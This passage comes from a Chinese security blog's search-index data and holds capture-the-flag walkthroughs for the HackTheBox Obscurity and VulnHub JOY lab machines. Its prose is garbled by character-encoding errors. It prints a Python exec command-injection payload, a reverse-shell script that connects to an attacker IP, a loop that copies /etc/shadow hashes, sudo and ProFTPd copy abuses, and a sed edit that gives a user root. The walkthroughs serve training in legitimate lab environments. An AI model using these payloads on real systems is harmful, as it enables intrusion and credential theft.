BufferedReader &#x3D; Java.type(&quot;java.io.BufferedReader&quot;);jjs&gt; var FileReader &#x3D; Java.type(&quot;java.io.FileReader&quot;);jjs&gt; var br &#x3D; new BufferedReader(new FileReader(&quot;&#x2F;root&#x2F;root.txt&quot;));jjs&gt; while ((line &#x3D; br.readLine()) !&#x3D; null) &#123; print(line); &#125;;8a8efXXXXXXXXXXXXXXXXXXXXXXXXXb15 0x04 Summary Mongoæ˜¯ä¸€ä¸ªä¸»è¦è€ƒå¯ŸNoSQLæ³¨å…¥çš„çš„é¶æœºï¼Œå¬è¿™ä¸ªé¶æœºçš„åå­—å°±æ„Ÿè§‰æ•°æ®åº“ç”¨çš„æ˜¯MongoDBï¼Œä¸ºæ­¤ç¬”è€…ä¸“é—¨å†™äº†ä¸€ä¸ªå…³äºNoSQLæ³¨å…¥ä¹‹MongoDBæ–‡ç« ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥å»çœ‹ä¸€çœ‹ã€‚è¿™æ¬¡ä¸»è¦è€ƒå¯ŸNoSQLçš„ç›²æ³¨æŠ€å·§ï¼Œå…¶å®ä¹Ÿæ²¡ä»€ä¹ˆæŠ€å·§ï¼Œä¸»è¦è¿˜æ˜¯å†™è„šæœ¬çš„èƒ½åŠ›å§ï¼Œæ„Ÿè§‰è¿˜æ˜¯ä¸å¤ªè¡Œï¼Œéœ€è¦è°ƒè¯•å¾ˆå¤šæ¬¡æ‰èƒ½passï¼Œä½†ç›¸ä¿¡å…ˆæ¨¡ä»¿ååˆ›é€ ï¼ŒåšæŒè‡ªå·±åŠ¨æ‰‹å†™ï¼Œåº”è¯¥è¿˜æ˜¯æ²¡é—®é¢˜çš„ã€‚","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"é¶æœº/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::Obscurity Walkthrough","date":"2020-03-09T02:45:28.000Z","path":"Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough/","text":"HTB::Obscurity Walkthrough 0x01 Introduction 0x02 Tools and Tips nmap wfuzz Pythonä»£ç å®¡è®¡ ä»£ç æ‰§è¡Œæ¼æ´ 0x03 Pentesting Nmapæ‰«æç«¯å£å‘ç°å¼€æ”¾äº† 8080 çš„webç«¯å£ é¡µé¢æç¤ºæœ‰ä¸€ä¸ªæºç æ³„éœ² 1Message to server devs: the current source code for the web server is in &#39;SuperSecureServer.py&#39; in the secret development directory é‚£æˆ‘ä»¬å°±éœ€è¦çˆ†ç ´ç›®å½•äº†ï¼Œä½¿ç”¨ wfuzz 1sudo wfuzz -c -z file,common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py å¾—åˆ°æœåŠ¡å™¨æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169import socketimport threadingfrom datetime import datetimeimport sysimport osimport mimetypesimport urllib.parseimport subprocessrespTemplate = &quot;&quot;&quot;HTTP/1.1 &#123;statusNum&#125; &#123;statusCode&#125;Date: &#123;dateSent&#125;Server: &#123;server&#125;Last-Modified: &#123;modified&#125;Content-Length: &#123;length&#125;Content-Type: &#123;contentType&#125;Connection: &#123;connectionType&#125;&#123;body&#125;&quot;&quot;&quot;DOC_ROOT = &quot;DocRoot&quot;CODES = &#123;&quot;200&quot;: &quot;OK&quot;, &quot;304&quot;: &quot;NOT MODIFIED&quot;, &quot;400&quot;: &quot;BAD REQUEST&quot;, &quot;401&quot;: &quot;UNAUTHORIZED&quot;, &quot;403&quot;: &quot;FORBIDDEN&quot;, &quot;404&quot;: &quot;NOT FOUND&quot;, &quot;500&quot;: &quot;INTERNAL SERVER ERROR&quot;&#125;MIMES = &#123;&quot;txt&quot;: &quot;text/plain&quot;, &quot;css&quot;:&quot;text/css&quot;, &quot;html&quot;:&quot;text/html&quot;, &quot;png&quot;: &quot;image/png&quot;, &quot;jpg&quot;:&quot;image/jpg&quot;, &quot;ttf&quot;:&quot;application/octet-stream&quot;,&quot;otf&quot;:&quot;application/octet-stream&quot;, &quot;woff&quot;:&quot;font/woff&quot;, &quot;woff2&quot;: &quot;font/woff2&quot;, &quot;js&quot;:&quot;application/javascript&quot;,&quot;gz&quot;:&quot;application/zip&quot;, &quot;py&quot;:&quot;text/plain&quot;, &quot;map&quot;: &quot;application/octet-stream&quot;&#125;class Response: def __init__(self, **kwargs): self.__dict__.update(kwargs) now = datetime.now() self.dateSent = self.modified = now.strftime(&quot;%a, %d %b %Y %H:%M:%S&quot;) def stringResponse(self): return respTemplate.format(**self.__dict__)class Request: def __init__(self, request): self.good = True try: request = self.parseRequest(request) self.method = request[&quot;method&quot;] self.doc = request[&quot;doc&quot;] self.vers = request[&quot;vers&quot;] self.header = request[&quot;header&quot;] self.body = request[&quot;body&quot;] except: self.good = False def parseRequest(self, request): req = request.strip(&quot;\\r&quot;).split(&quot;\\n&quot;) method,doc,vers = req[0].split(&quot; &quot;) header = req[1:-3] body = req[-1] headerDict = &#123;&#125; for param in header: pos = param.find(&quot;: &quot;) key, val = param[:pos], param[pos+2:] headerDict.update(&#123;key: val&#125;) return &#123;&quot;method&quot;: method, &quot;doc&quot;: doc, &quot;vers&quot;: vers, &quot;header&quot;: headerDict, &quot;body&quot;: body&#125;class Server: def __init__(self, host, port): self.host = host self.port = port self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.sock.bind((self.host, self.port)) def listen(self): self.sock.listen(5) while True: client, address = self.sock.accept() client.settimeout(60) threading.Thread(target = self.listenToClient,args = (client,address)).start() def listenToClient(self, client, address): size = 1024 while True: try: data = client.recv(size) if data: # Set the response to echo back the recieved data req = Request(data.decode()) self.handleRequest(req, client, address) client.shutdown() client.close() else: raise error(&#x27;Client disconnected&#x27;) except: client.close() return False def handleRequest(self, request, conn, address): if request.good:# try: # print(str(request.method) + &quot; &quot; + str(request.doc), end=&#x27; &#x27;) # print(&quot;from &#123;0&#125;&quot;.format(address[0]))# except Exception as e:# print(e) document = self.serveDoc(request.doc, DOC_ROOT) statusNum=document[&quot;status&quot;] else: document = self.serveDoc(&quot;/errors/400.html&quot;, DOC_ROOT) statusNum=&quot;400&quot; body = document[&quot;body&quot;] statusCode=CODES[statusNum] dateSent = &quot;&quot; server = &quot;BadHTTPServer&quot; modified = &quot;&quot; length = len(body) contentType = document[&quot;mime&quot;] # Try and identify MIME type from string connectionType = &quot;Closed&quot; resp = Response( statusNum=statusNum, statusCode=statusCode, dateSent = dateSent, server = server, modified = modified, length = length, contentType = contentType, connectionType = connectionType, body = body ) data = resp.stringResponse() if not data: return -1 conn.send(data.encode()) return 0 def serveDoc(self, path, docRoot): path = urllib.parse.unquote(path) try: info = &quot;output = &#x27;Document: &#123;&#125;&#x27;&quot; # Keep the output for later debug exec(info.format(path)) # This is how you do string formatting, right? cwd = os.path.dirname(os.path.realpath(__file__)) docRoot = os.path.join(cwd, docRoot) if path == &quot;/&quot;: path = &quot;/index.html&quot; requested = os.path.join(docRoot, path[1:]) if os.path.isfile(requested): mime = mimetypes.guess_type(requested) mime = (mime if mime[0] != None else &quot;text/html&quot;) mime = MIMES[requested.split(&quot;.&quot;)[-1]] try: with open(requested, &quot;r&quot;) as f: data = f.read() except: with open(requested, &quot;rb&quot;) as f: data = f.read() status = &quot;200&quot; else: errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;404.html&quot;) mime = &quot;text/html&quot; with open(errorPage, &quot;r&quot;) as f: data = f.read().format(path) status = &quot;404&quot; except Exception as e: print(e) errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;500.html&quot;) mime = &quot;text/html&quot; with open(errorPage, &quot;r&quot;) as f: data = f.read() status = &quot;500&quot; return &#123;&quot;body&quot;: data, &quot;mime&quot;: mime, &quot;status&quot;: status&#125; å®¡è®¡æºç ï¼Œå¤§è‡´è¯´ä¸€ä¸‹ä»£ç çš„å«ä¹‰ï¼Œå¼€å¯socketç›‘å¬ï¼Œæ¥æ”¶åˆ°httpè¯·æ±‚ï¼Œè°ƒç”¨ Request ç±»çš„ parseRequest æ–¹æ³•åšåˆ†å‰²ï¼Œç„¶åè°ƒç”¨ handleRequest å¤„ç†è¯·æ±‚ï¼Œé€šè¿‡ serveDoc å¤„ç†è¯·æ±‚çš„æ–‡æ¡£ã€‚ æŸ¥æ‰¾æ•æ„Ÿå‡½æ•°å‘ç°å…³é”®ç‚¹ï¼š 1234567def serveDoc(self, path, docRoot): path = urllib.parse.unquote(path) try: info = &quot;output = &#x27;Document: &#123;&#125;&#x27;&quot; # Keep the output for later debug exec(info.format(path)) # This is how you do string formatting, right? cwd = os.path.dirname(os.path.realpath(__file__)) docRoot = os.path.join(cwd, docRoot) è¿™é‡Œçš„pathæ˜¯æ±¡ç‚¹å‚æ•°ï¼Œexecå‡½æ•°å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼š 1path = &quot;\\&#x27;;os.system(&#x27;whoami&#x27;)#&quot; ç„¶åé€šè¿‡pythonåå¼¹shellï¼š 123456789101112131415import requestsimport urllibimport osurl = &#x27;http://10.10.10.168:8080/&#x27;path=&#x27;5\\&#x27;&#x27;+&#x27;\\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.146&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])\\na=\\&#x27;&#x27;payload = urllib.parse.quote(path)print(&quot;payload&quot;)print(url+payload)r= requests.get(url+payload)print(r.headers)print(r.text) Python åå¼¹shellè®²è§£ï¼šhttps://www.leavesongs.com/PYTHON/python-shell-backdoor.html è¿›å…¥robertç›®å½•ï¼š æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶ check.txt 1Encrypting this file with your key should result in out.txt, make sure your key is correct! chect.txtåŠ å¯†åçš„ç»“æœæ˜¯out.txt 1234567891011121314www-data@obscure:&#x2F;home&#x2F;robert$ xxd out.txtxxd out.txt00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b ................00000010: c39d c39d c289 c397 c390 c38a c39f c285 ................00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d ................00000030: c38b c288 c39a c39b c39a c3aa c281 c399 ................00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d ................00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3 ................00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6 ................00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e ................00000080: c38d c281 c39f c39a c3aa c386 c28e c39d ................00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c ................000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b ................000000b0: c38c c397 c289 c281 76 ........v passwordreminder.txt 1234www-data@obscure:&#x2F;home&#x2F;robert$ xxd passwordreminder.txtxxd passwordreminder.txt00000000: c2b4 c391 c388 c38c c389 c3a0 c399 c381 ................00000010: c391 c3a9 c2af c2b7 c2bf 6b ..........k SuperSecureCrypt.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import sysimport argparsedef encrypt(text, key): keylen = len(key) keyPos = 0 encrypted = &quot;&quot; for x in text: keyChr = key[keyPos] newChr = ord(x) newChr = chr((newChr + ord(keyChr)) % 255) encrypted += newChr keyPos += 1 keyPos = keyPos % keylen return encrypteddef decrypt(text, key): keylen = len(key) keyPos = 0 decrypted = &quot;&quot; for x in text: keyChr = key[keyPos] newChr = ord(x) newChr = chr((newChr - ord(keyChr)) % 255) decrypted += newChr keyPos += 1 keyPos = keyPos % keylen return decryptedparser = argparse.ArgumentParser(description=&#x27;Encrypt with 0bscura\\&#x27;s encryption algorithm&#x27;)parser.add_argument(&#x27;-i&#x27;, metavar=&#x27;InFile&#x27;, type=str, help=&#x27;The file to read&#x27;, required=False)parser.add_argument(&#x27;-o&#x27;, metavar=&#x27;OutFile&#x27;, type=str, help=&#x27;Where to output the encrypted/decrypted file&#x27;, required=False)parser.add_argument(&#x27;-k&#x27;, metavar=&#x27;Key&#x27;, type=str, help=&#x27;Key to use&#x27;, required=False)parser.add_argument(&#x27;-d&#x27;, action=&#x27;store_true&#x27;, help=&#x27;Decrypt mode&#x27;)args = parser.parse_args()banner = &quot;################################\\n&quot;banner+= &quot;# BEGINNING #\\n&quot;banner+= &quot;# SUPER SECURE ENCRYPTOR #\\n&quot;banner+= &quot;################################\\n&quot;banner += &quot; ############################\\n&quot;banner += &quot; # FILE MODE #\\n&quot;banner += &quot; ############################&quot;print(banner)if args.o == None or args.k == None or args.i == None: print(&quot;Missing args&quot;)else: if args.d: print(&quot;Opening file &#123;0&#125;...&quot;.format(args.i)) with open(args.i, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: data = f.read() print(&quot;Decrypting...&quot;) decrypted = decrypt(data, args.k) print(&quot;Writing to &#123;0&#125;...&quot;.format(args.o)) with open(args.o, &#x27;w&#x27;, encoding=&#x27;UTF-8&#x27;) as f: f.write(decrypted) else: print(&quot;Opening file &#123;0&#125;...&quot;.format(args.i)) with open(args.i, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: data = f.read() print(&quot;Encrypting...&quot;) encrypted = encrypt(data, args.k) print(&quot;Writing to &#123;0&#125;...&quot;.format(args.o)) with open(args.o, &#x27;w&#x27;, encoding=&#x27;UTF-8&#x27;) as f: f.write(encrypted) BetterSSH.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import sysimport random, stringimport osimport timeimport cryptimport tracebackimport subprocesspath = &#x27;&#x27;.join(random.choices(string.ascii_letters + string.digits, k=8))session = &#123;&quot;user&quot;: &quot;&quot;, &quot;authenticated&quot;: 0&#125;try: session[&#x27;user&#x27;] = input(&quot;Enter username: &quot;) passW = input(&quot;Enter password: &quot;) with open(&#x27;/etc/shadow&#x27;, &#x27;r&#x27;) as f: data = f.readlines() data = [(p.split(&quot;:&quot;) if &quot;$&quot; in p else None) for p in data] passwords = [] for x in data: if not x == None: passwords.append(x) passwordFile = &#x27;\\n&#x27;.join([&#x27;\\n&#x27;.join(p) for p in passwords]) with open(&#x27;/tmp/SSH/&#x27;+path, &#x27;w&#x27;) as f: f.write(passwordFile) time.sleep(.1) salt = &quot;&quot; realPass = &quot;&quot; for p in passwords: if p[0] == session[&#x27;user&#x27;]: salt, realPass = p[1].split(&#x27;$&#x27;)[2:] break if salt == &quot;&quot;: print(&quot;Invalid user&quot;) os.remove(&#x27;/tmp/SSH/&#x27;+path) sys.exit(0) salt = &#x27;$6$&#x27;+salt+&#x27;$&#x27; realPass = salt + realPass hash = crypt.crypt(passW, salt) if hash == realPass: print(&quot;Authed!&quot;) session[&#x27;authenticated&#x27;] = 1 else: print(&quot;Incorrect pass&quot;) os.remove(&#x27;/tmp/SSH/&#x27;+path) sys.exit(0) os.remove(os.path.join(&#x27;/tmp/SSH/&#x27;,path))except Exception as e: traceback.print_exc() sys.exit(0)if session[&#x27;authenticated&#x27;] == 1: while True: command = input(session[&#x27;user&#x27;] + &quot;@Obscure$ &quot;) cmd = [&#x27;sudo&#x27;, &#x27;-u&#x27;, session[&#x27;user&#x27;]] cmd.extend(command.split(&quot; &quot;)) proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE) o,e = proc.communicate() print(&#x27;Output: &#x27; + o.decode(&#x27;ascii&#x27;)) print(&#x27;Error: &#x27; + e.decode(&#x27;ascii&#x27;)) if len(e.decode(&#x27;ascii&#x27;)) &gt; 0 else print(&#x27;&#x27;) ç°åœ¨å·²çŸ¥æ¡ä»¶æ˜¯æ˜æ–‡check.txtï¼Œå¯†æ–‡out.txtï¼Œä»¥åŠåŠ å¯†ç®—æ³•encryptï¼Œæ±‚è§£å¯†é’¥ï¼Œçˆ†ç ´Pythonä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516import stringwith open(&#x27;check.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f: mingwen = f.read()key = &#x27;&#x27;with open(&#x27;out.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f: miwen = f.read() for c in range(len(mingwen)): for i in range(255): ch = chr((ord(miwen[c]) - i) % 255) if ch == mingwen[c]: key += chr(i) breakprint(key) å¾—åˆ°å¯†é’¥alexandrovichï¼Œè§£å¯†passwordreminder.txtï¼š ä½¿ç”¨è¿™ä¸ªå¯†ç ç™»å½•robertçš„SSHç»ˆç«¯ï¼Œè·å¾—user.txtã€‚ sudo -læŸ¥çœ‹èƒ½å¤Ÿä»¥rootèº«ä»½æ‰§è¡Œçš„å‘½ä»¤ï¼š 123456robert@obscure:~$ sudo -lMatching Defaults entries for robert on obscure: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser robert may run the following commands on obscure: (ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;home&#x2F;robert&#x2F;BetterSSH&#x2F;BetterSSH.py å®¡è®¡æºç å‘ç°å…³é”®ç‚¹ï¼š 1234567891011with open(&#x27;/etc/shadow&#x27;, &#x27;r&#x27;) as f: data = f.readlines()data = [(p.split(&quot;:&quot;) if &quot;$&quot; in p else None) for p in data]passwords = []for x in data: if not x == None: passwords.append(x)passwordFile = &#x27;\\n&#x27;.join([&#x27;\\n&#x27;.join(p) for p in passwords])with open(&#x27;/tmp/SSH/&#x27;+path, &#x27;w&#x27;) as f: f.write(passwordFile) ç¨‹åºä¼šå°† /etc/shadow å†™å…¥åˆ° /tmp/SSH çš„æŸä¸ªéšæœºçš„ç›®å½•ä¸­ï¼Œäºæ˜¯æƒ³åˆ°æˆ‘ä»¬åªéœ€è¦å†™ä¸ªæ­»å¾ªç¯ä¸æ–­åœ°å¤åˆ¶è¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶å³å¯ 123456import shutilimport oswhile True: files = os.listdir(&quot;./SSH&quot;) for file in files: shutil.copy(os.path.join(&quot;./SSH&quot;, file), &quot;./flag&quot;); ç„¶åæˆ‘ä»¬æ‰§è¡Œå°±ä¼šå‘ç° flag ç›®å½•ä¸­å­˜åœ¨æ–‡ä»¶ å†ç”¨Johnå…‰é€Ÿè§£å¯†å¾—åˆ°mercedesï¼Œææƒ è¿˜æœ‰ä¸€ç§æ›´å¸¸è§„çš„ææƒæ–¹æ³•ï¼š 123456if session[&#x27;authenticated&#x27;] == 1: while True: command = input(session[&#x27;user&#x27;] + &quot;@Obscure$ &quot;) cmd = [&#x27;sudo&#x27;, &#x27;-u&#x27;, session[&#x27;user&#x27;]] cmd.extend(command.split(&quot; &quot;)) proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE) sudo -u robert -u rootä¼šè¦†ç›–å‰é¢ä¸€ä¸ª-uçš„å‚æ•°å€¼ã€‚ 0x04 Summary Obscurityé¶æœºæ˜¯æˆ‘åšçš„ç¬¬ä¸€ä¸ªä¸æ˜¯CVEç±»å‹çš„é¶æœºï¼Œæºç å®¡è®¡èµ·æ¥æœ‰äº›åƒåŠ›ï¼Œå¤šçœ‹çœ‹è¿™ç§ç±»å‹çš„åº”è¯¥ä¼šå¥½ä¸€äº›ã€‚é¦–å…ˆæ˜¯æœåŠ¡å™¨æºç å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ä»è€Œåå¼¹shellï¼Œä»¥www-dataçš„èº«ä»½ç™»å½•é¶æœºã€‚ç„¶åä½œè€…æä¾›äº†ä¸€ä¸ªå¯†æ–‡ã€æ˜æ–‡ä»¥åŠåŠ è§£å¯†ç®—æ³•ï¼Œè®©æˆ‘ä»¬å†™è„šæœ¬çˆ†ç ´å‡ºå¯†é’¥ï¼Œé€šè¿‡è¿™ä¸ªå¯†é’¥å¾—åˆ°robertç”¨æˆ·çš„ç™»å½•å¯†ç ï¼Œå¾—åˆ°user.txtã€‚ç„¶ååœ¨BetterSSH.pyä¸­å­˜åœ¨ä¸¤å¤„å¯ä»¥åˆ©ç”¨çš„æ¼æ´ï¼Œç¬¬ä¸€å¤„æ¼æ´æœ‰ç‚¹ç±»ä¼¼äºæ¡ä»¶ç«äº‰ï¼Œç”¨ä¸€ä¸ªæ­»å¾ªç¯çš„è„šæœ¬æŠŠBetterSSH.pyä»/etc/shadowå¤åˆ¶åˆ°/tmp/SSHçš„æ–‡ä»¶å†æ¬¡å¤åˆ¶åˆ°ä¸€ä¸ªè‡ªå®šä¹‰çš„ç›®å½•ä¸‹é¢ï¼Œä»è€Œå¾—åˆ°rootçš„å¯†ç ã€‚ç¬¬äºŒå¤„æ¼æ´ï¼Œè™½ç„¶-uå‚æ•°æŒ‡å®šäº†å½“å‰ç”¨æˆ·çš„æƒé™æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯ç”¨æˆ·è¾“å…¥çš„ç¬¬äºŒä¸ª-u rootå¯ä»¥è¦†ç›–æ‰ç¬¬ä¸€ä¸ª-uå‚æ•°ä»è€Œç»•è¿‡ã€‚æ€»çš„æ¥è¯´ï¼Œå®¡è®¡ä»£ç å’Œç¼–å†™ä»£ç çš„èƒ½åŠ›éƒ½æœ‰å¾…åŠ å¼ºã€‚ 0x05 Reference https://www.leavesongs.com/PYTHON/python-shell-backdoor.html","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"é¶æœº/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"VulnHub::DigitalWorld.Local:JOY Walkthrough","date":"2020-02-29T04:08:00.000Z","path":"Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough/","text":"VulnHub::DigitalWorld.Local:JOY Walkthrough 0x01 Introduction Does penetration testing spark joy? If it does, this machine is for you. This machine is full of services, full of fun, but how many ways are there to align the stars? Perhaps, just like the child in all of us, we may find joy in a playground such as this. This is somewhat OSCP-like for learning value, but is nowhere as easy to complete with an OSCP exam timeframe. But if you found this box because of preparation for the OSCP, you might as well try harder. ğŸ˜ƒ If you MUST have hints for this machine (even though they will probably not help you very much until you root the box!): Joy is (#1): https://www.youtube.com/watch?v=9AvWs2X-bEA, (#2): something that should be replicated, (#3): what happens when you clean out seemingly â€œhiddenâ€ closets. Note: There are at least two reliable ways of obtaining user privileges and rooting this machine. Have fun. ğŸ˜ƒ Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment. Download Linkï¼šhttps://www.vulnhub.com/entry/digitalworldlocal-joy,298/ 0x02 Tools and Tips Scanning Nmap Enumeration FTP anonymous login Exploit Exploit proftpd using Metasploit Privilege Escalation Sudo right 0x03 Pentesting æ‰«æç½‘æ®µï¼Œå‘ç°é¶æœºIPåœ°å€192.168.0.108ï¼š æ‰«æé¶æœºç«¯å£ï¼š å‘ç°FTPæ˜¯å¯ä»¥åŒ¿åç™»å½•çš„ï¼Œç›´æ¥ä½¿ç”¨FileZillaå·¥å…·ç™»å½•ç«™ç‚¹æŸ¥çœ‹æ–‡ä»¶ ä¸€è·¯çœ‹ä¸‹æ¥å‘ç°directoryæ–‡ä»¶åˆ—å‡ºäº†/home/patrickç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå‰”é™¤ä¸€äº›å¸¸è§çš„å’Œéšæœºç”Ÿæˆçš„æ–‡ä»¶ä¹‹å¤–ï¼Œå°±å‰©ä¸‹verison_controlå€¼å¾—çœ‹ä¸€çœ‹ï¼Œç”¨ä¸‹é¢çš„å‘½ä»¤æŠŠæ–‡ä»¶å¤åˆ¶åˆ°FTPç«™ç‚¹ç›®å½•ï¼š telnetå’Œftpå‘½ä»¤çš„åŒºåˆ«ï¼š telnetè¿æ¥åï¼Œç”¨æˆ·ä¸»æœºå®é™…æˆä¸ºè¿œç¨‹TELNETæœåŠ¡å™¨çš„ä¸€ä¸ªè™šæ‹Ÿç»ˆç«¯ï¼ˆæˆ–ç§°æ˜¯å“‘ç»ˆç«¯ï¼‰ï¼Œä¸€åˆ‡æœåŠ¡å®Œå…¨åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä½†ç”¨æˆ·å†³ä¸èƒ½ä»è¿œç¨‹æœåŠ¡å™¨ä¸­ä¸‹è½½æˆ–ä¸Šä¼ æ–‡ä»¶ï¼Œæˆ–æ‹·è´æ–‡ä»¶åˆ°ç”¨æˆ·ä¸»æœºä¸­æ¥ã€‚ ftpåˆ™ä¸åŒï¼Œå®ƒæ˜¯é‡‡ç”¨å®¢æˆ·æœº/æœåŠ¡å™¨æ¨¡å¼ï¼Œç”¨æˆ·èƒ½å¤Ÿæ“ä½œFTPæœåŠ¡å™¨ä¸­çš„ç›®å½•ï¼Œä¸Šä¼ æˆ–ä¸‹è½½æ–‡ä»¶ï¼Œä½†ç”¨æˆ·ä¸èƒ½è¯·æ±‚æœåŠ¡å™¨æ‰§è¡ŒæŸä¸ªæ–‡ä»¶ã€‚ version_controlæ–‡ä»¶å¦‚ä¸‹ï¼š 123456789101112Version Control of External-Facing Services:Apache: 2.4.25Dropbear SSH: 0.34ProFTPd: 1.3.5Samba: 4.5.12We should switch to OpenSSH and upgrade ProFTPd.Note that we have some other configurations in this machine.1. The webroot is no longer &#x2F;var&#x2F;www&#x2F;html. We have changed it to &#x2F;var&#x2F;www&#x2F;tryingharderisjoy.2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out. æç¤ºæˆ‘ä»¬ProFTPéœ€è¦å‡çº§ï¼Œæˆ‘ä»¬å…ˆä»è¿™å…¥æ‰‹ï¼š ç›´æ¥ä¸ŠMetasploitï¼š è¿”å›ä¸€ä¸ªæ ‡å‡†Shellï¼š æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æœ‰å“ªäº›æ–‡ä»¶ï¼š æœ‰ä¸€ä¸ªL37ISF8.phpæ–‡ä»¶æ˜¯åˆšåˆšexpç”Ÿæˆçš„ï¼Œæ¥ç€çœ‹ossecç›®å½•ï¼š æœ‰ä¸€ä¸ªæ¯”è¾ƒå¯ç–‘çš„æ–‡ä»¶patricksecretsofjoyï¼š æœ‰patrickç”¨æˆ·çš„ç™»å½•å¯†ç ï¼Œrootçš„å¯†ç ç®—æ˜¯ä½œè€…çš„æ¶æå§ã€‚ç›´æ¥ç™»å½•patrickç”¨æˆ·ï¼Œå°è¯•ææƒï¼š åˆ°è¿™é‡Œå°±æœ‰ä¸¤ç§æ€è·¯ç”¨æ¥ææƒï¼š åˆ©ç”¨/home/patrick/script/testçš„è„šæœ¬æ–‡ä»¶æ¥æ›´æ”¹/etc/passwdçš„æƒé™ï¼Œè¿›è€Œä¿®æ”¹patrickç”¨æˆ·çš„æƒé™ï¼› ä¸Šä¼ è‡ªå·±ç¼–å†™çš„è„šæœ¬è‡³ç›¸åŒçš„ç›®å½•ã€‚è¿™é‡Œå°±æ–‡å­—å™è¿°ä¸€ä¸‹å…·ä½“è¿‡ç¨‹ï¼š a) é¦–å…ˆåœ¨æœ¬æœºä¸Šç¼–å†™Shellè„šæœ¬echo &quot;awk 'BEGIN &#123;system(\\&quot;/bin/bash\\&quot;)&#125;'&quot; &gt; testï¼› b) å†ä½¿ç”¨ftpä¸Šä¼ åˆ°uploadç›®å½•ï¼š 123ftp 192.168.0.108cd uploadput test c) å†ä½¿ç”¨telnetä¼ å…¥åˆ°/home/patrick/script 123telnet 192.168.0.108 21site cpfr &#x2F;home&#x2F;ftp&#x2F;upload&#x2F;testsite cpto &#x2F;home&#x2F;patrick&#x2F;script&#x2F;test d) å†æ‰§è¡Œtestæ–‡ä»¶sudo /home/patrick/script/test ç›¸å¯¹è€Œè¨€ç¬¬ä¸€ä¸ªæ€è·¯ä¼šæ¯”è¾ƒç®€å•ï¼Œä¿®æ”¹æƒé™ï¼š ä¿®æ”¹Patrickç”¨æˆ·çš„uidå’Œgidï¼š è¿™é‡Œå¯ä»¥ç›´æ¥ç™»å½•é¶æœºç”¨nanoä¿®æ”¹ï¼Œä½†æ˜¯å¦‚ä½•åœ¨ä¸»æœºä¸Šçš„åå¼¹shellä¿®æ”¹å‘¢ï¼Ÿå› ä¸ºåå¼¹shellä¸æ”¯æŒvim, vi, nanoç­‰äº¤äº’å¼çª—å£ï¼Œä½†æ˜¯åˆ«å¿˜äº†è¿˜æœ‰ä¸€ä¸ªsedå‘½ä»¤å¯ä»¥ç”¨æ¥ç¼–è¾‘æ–‡ä»¶ï¼Œsed '36,36s/1000:1000/0:0/g' 